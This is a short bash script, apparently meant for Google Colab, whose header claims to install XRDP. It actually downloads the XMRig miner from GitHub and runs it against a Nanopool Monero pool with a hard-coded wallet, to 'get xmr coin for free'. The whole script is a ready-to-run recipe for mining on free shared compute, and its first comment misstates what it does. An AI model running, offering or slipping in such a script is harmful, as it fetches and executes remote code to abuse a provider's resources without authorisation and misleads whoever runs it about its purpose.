#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o xmr-asia1.nanopool.org:14433 -u 8AkRUhzcDUqYiQ5dNeXKuf5uD2cDZDZ9xYHUJttFeeVa4MQyEYJYHjtCfYunNb439iNHR18v62v5DCyPqyChbEw5PUAk92X -k --tls --rig-id GC-US
